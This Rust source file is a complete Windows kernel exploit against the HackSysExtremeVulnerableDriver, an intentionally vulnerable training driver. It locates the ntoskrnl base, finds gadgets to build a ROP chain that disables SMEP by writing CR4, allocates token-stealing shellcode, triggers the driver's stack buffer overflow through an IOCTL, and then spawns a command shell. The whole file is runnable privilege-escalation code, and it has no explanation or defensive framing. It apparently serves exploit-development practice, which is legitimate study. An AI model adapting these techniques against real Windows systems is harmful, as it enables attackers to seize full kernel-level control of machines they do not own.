use core::ffi::c_void;
use std::iter;

use win_kexp::rop::find_gadget_offset;
use win_kexp::shellcode::token_stealing_shellcode;
use win_kexp::util::bytes_to_hex_string;
use win_kexp::{create_rop_chain, CTL_CODE, IOCTL};
use win_kexp::{
    rop::get_executable_sections,
    win32k::{
        allocate_shellcode, close_handle, create_cmd_process, get_device_handle,
        get_ntoskrnl_base_address, io_device_control, load_library_no_resolve, FILE_ANY_ACCESS,
        FILE_DEVICE_UNKNOWN, METHOD_NEITHER,
    },
};

const HEVD_IOCTL_BUFFER_OVERFLOW_STACK: u32 = IOCTL!(0x800);

fn build_smep_disable_rop_chain(
    krnl_name: &str,
    kernel_base: u64,
    base_offset: usize,
    shellcode_address: u64,
) -> Vec<u8> {
    let ntoskrnl_handle = load_library_no_resolve(krnl_name).expect("[-] Failed to load ntoskrnl");

    let sections =
        get_executable_sections(ntoskrnl_handle).expect("[-] Failed to get executable sections");
    let sections_clone = sections.clone();

    let pop_crx_ret_address = find_gadget_offset(sections, &[0x59, 0xC3], kernel_base)
        .expect("[-] Failed to find pop crx ; ret gadget");

    println!("[+] Found pop crx ; ret gadget at 0x{pop_crx_ret_address:x}");

    let mov_cr4_crx_ret_address =
        find_gadget_offset(sections_clone, &[0x0F, 0x22, 0xE1, 0xC3], kernel_base)
            .expect("[-] Failed to find mov cr4, crx ; ret gadget");

    println!("[+] Found mov cr4, crx ; ret gadget at 0x{mov_cr4_crx_ret_address:x}");

    let rop_chain = create_rop_chain!(
        base_offset,
        pop_crx_ret_address,
        0x250EF8 as u64,
        mov_cr4_crx_ret_address,
        shellcode_address
    );

    rop_chain
}

fn exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow() {
    let device_path = r"\\.\HackSysExtremeVulnerableDriver\0";

    println!("[+] Getting device handle {device_path}...");

    let h_device = get_device_handle(device_path);

    println!("[+] Successfully opened device handle.");

    println!("[+] Getting ntoskrnl base address...");

    let ntoskrnl = get_ntoskrnl_base_address().expect("[-] Failed to get ntoskrnl base address");
    let ntoskrnl_address = ntoskrnl as u64;

    println!("[+] Ntoskrnl base address: 0x{ntoskrnl_address:x}");

    println!("[+] Building payload...");
    let shellcode = token_stealing_shellcode();
    let (payload, payload_len) = allocate_shellcode(shellcode.as_ptr(), shellcode.len());

    let payload_address = payload as u64;
    let bytes = bytes_to_hex_string(payload, payload_len);

    println!("\t[*] Payload address: 0x{payload_address:x}");
    println!("\t[*] Payload: 0x{bytes}");

    let ret_overwrite_offset = 0x818;

    let user_buffer = build_smep_disable_rop_chain(
        "ntoskrnl.exe",
        ntoskrnl_address,
        ret_overwrite_offset,
        payload_address,
    );

    println!("[+] Triggering stack buffer overflow...");

    let user_buffer_address = user_buffer.as_ptr() as *mut c_void;
    let user_buffer_address_hex = user_buffer_address as u64;
    println!("\t[*] Address of user buffer: 0x{user_buffer_address_hex:x}");

    io_device_control(
        h_device,
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        user_buffer_address,
        user_buffer.len().try_into().unwrap(),
    );

    close_handle(h_device);

    println!("[+] Successfully closed device handle.");

    let pi = create_cmd_process();

    println!("[+] Process created with ID: {}", pi.dwProcessId);
}

fn main() {
    exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow();
}
